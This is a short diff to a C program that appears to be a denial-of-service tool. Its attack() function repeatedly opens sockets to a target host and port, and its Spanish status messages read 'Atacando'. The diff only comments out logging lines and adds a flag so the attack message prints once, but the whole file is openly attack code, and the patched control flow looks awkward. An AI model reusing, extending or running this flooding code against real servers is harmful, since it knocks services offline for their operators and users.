@@ -11,6 +11,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+int enviomsj;
 
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
@@ -41,7 +42,7 @@ int make_socket(char *host, char *port) {
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	#fprintf(stderr, "[Conectando -> %s:%s]\n", host, port);
+	//fprintf(stderr, "[Conectando -> %s:%s]\n", host, port);
 	return sock;
 }
 
@@ -68,9 +69,13 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			#fprintf(stderr, "[%i: Atacando]\n", id);
+      if(enviomsj != 1)
+      {
+			//fprintf(stderr, "[%i: Atacando]\n", id);
+      enviomsj = 1;
+      }
 		}
-		#fprintf(stderr, "[%i: Atacando]\n", id);
+		//fprintf(stderr, "[Atacando]\n", id);
 		usleep(300000);
 	}
 }
